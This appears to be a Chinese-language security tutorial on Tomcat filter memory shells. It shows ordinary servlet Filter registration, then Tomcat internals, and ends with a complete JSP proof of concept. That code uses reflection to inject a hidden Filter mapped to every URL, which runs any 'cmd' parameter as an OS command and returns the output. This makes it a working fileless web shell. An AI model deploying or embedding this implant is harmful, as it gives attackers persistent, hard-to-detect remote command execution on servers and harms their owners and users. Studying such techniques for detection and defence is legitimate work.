# 0x01 Filter First Shoot

1. 引入servlet依赖

   ```xml
   <dependency>
       <groupId>javax.servlet</groupId>
       <artifactId>javax.servlet-api</artifactId>
       <version>4.0.1</version>
   </dependency>
   <dependency>
       <groupId>org.apache.tomcat</groupId>
       <artifactId>tomcat-catalina</artifactId>
       <version>9.0.20</version>
   </dependency>
   ```

2. 自定义过滤器

```java
package filters;

import javax.servlet.*;
import java.io.IOException;

public class MyFilter implements Filter {

    public void init(FilterConfig filterConfig) throws ServletException {
        System.out.println("My Filter is initializing");
    }

    public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException {
        System.out.println("doFilter Start");
        filterChain.doFilter(servletRequest, servletResponse);
        System.out.println("doFilter End");
    }

    public void destroy() {
        System.out.println("My Filter is destroyed");
    }
}
```

3. 注册过滤器（web.xml）

   ```xml
   <filter>
       <filter-name>MyFilter</filter-name>
       <filter-class>filters.MyFilter</filter-class>
   </filter>
   <filter-mapping>
       <filter-name>MyFilter</filter-name>
       <url-pattern>/filter</url-pattern>
   </filter-mapping>
   ```

过滤器其实是一个链式结构，称为filterChain，`FilterChain.doFilter()`会调用下一个Filter的`doFilter`方法
直到最后一个Filter将调用目标 `Servlet.service()`方法。所以只要中间某个Filter没有调用`doFilter`方法， `Servlet.service()`就不会执行

# 0x02 Create Filter Memory Shell

`org.apache.catalina.core.StandardContext#filterStart`

```java
public boolean filterStart() {
    for (Entry<String,FilterDef> entry : filterDefs.entrySet()) {
        String name = entry.getKey();
        if (getLogger().isDebugEnabled()) {
            getLogger().debug(" Starting filter '" + name + "'");
        }
        try {
            ApplicationFilterConfig filterConfig =
                new ApplicationFilterConfig(this, entry.getValue());
            filterConfigs.put(name, filterConfig);
        }
    }
}
```

注册Filter分两步：

Ⅰ. 从`filterDefs`（HashMap）中拿出一个`FilterDef`（Entry）
Ⅱ. 传入`FilterDef`实例化`ApplicationFilterConfig`，放入`filterConfigs`

```java
ApplicationFilterConfig(Context context, FilterDef filterDef) {
    super();

    this.context = context;
    this.filterDef = filterDef;
    // Allocate a new filter instance if necessary
    if (filterDef.getFilter() == null) {
        getFilter();
    } else {
        this.filter = filterDef.getFilter();
        context.getInstanceManager().newInstance(filter);
        initFilter();
    }
}
```

# 0x03 POC

```java
<%@ page import="org.apache.catalina.core.ApplicationContext" %>
<%@ page import="java.lang.reflect.Field" %>
<%@ page import="org.apache.catalina.core.StandardContext" %>
<%@ page import="java.util.Map" %>
<%@ page import="java.io.IOException" %>
<%@ page import="org.apache.tomcat.util.descriptor.web.FilterDef" %>
<%@ page import="org.apache.tomcat.util.descriptor.web.FilterMap" %>
<%@ page import="java.lang.reflect.Constructor" %>
<%@ page import="org.apache.catalina.core.ApplicationFilterConfig" %>
<%@ page import="org.apache.catalina.Context" %>
<%@ page language="java" contentType="text/html; charset=UTF-8" pageEncoding="UTF-8"%>

<%
    final String name = "p4d0rn";
    ServletContext servletContext = request.getSession().getServletContext();

    Field appctx = servletContext.getClass().getDeclaredField("context");
    appctx.setAccessible(true);
    ApplicationContext applicationContext = (ApplicationContext) appctx.get(servletContext);

    Field stdctx = applicationContext.getClass().getDeclaredField("context");
    stdctx.setAccessible(true);
    StandardContext standardContext = (StandardContext) stdctx.get(applicationContext);

    Field Configs = standardContext.getClass().getDeclaredField("filterConfigs");
    Configs.setAccessible(true);
    Map filterConfigs = (Map) Configs.get(standardContext);

    if (filterConfigs.get(name) == null){
        Filter filter = new Filter() {
            @Override
            public void init(FilterConfig filterConfig) throws ServletException {

            }

            @Override
            public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException {
                HttpServletRequest req = (HttpServletRequest) servletRequest;
                if (req.getParameter("cmd") != null){
                    byte[] bytes = new byte[1024];
                    Process process = new ProcessBuilder("cmd","/c",req.getParameter("cmd")).start();
                    int len = process.getInputStream().read(bytes);
                    servletResponse.getWriter().write(new String(bytes,0,len));
                    process.destroy();
                    return;
                }
                filterChain.doFilter(servletRequest,servletResponse);
            }

            @Override
            public void destroy() {

            }

        };


        FilterDef filterDef = new FilterDef();
        filterDef.setFilter(filter);
        filterDef.setFilterName(name);
        filterDef.setFilterClass(filter.getClass().getName());
        standardContext.addFilterDef(filterDef);

        FilterMap filterMap = new FilterMap();
        filterMap.addURLPattern("/*");
        filterMap.setFilterName(name);
        filterMap.setDispatcher(DispatcherType.REQUEST.name());

        standardContext.addFilterMapBefore(filterMap);

        Constructor constructor = ApplicationFilterConfig.class.getDeclaredConstructor(Context.class,FilterDef.class);
        constructor.setAccessible(true);
        ApplicationFilterConfig filterConfig = (ApplicationFilterConfig) constructor.newInstance(standardContext,filterDef);

        filterConfigs.put(name,filterConfig);
    }
%>
```

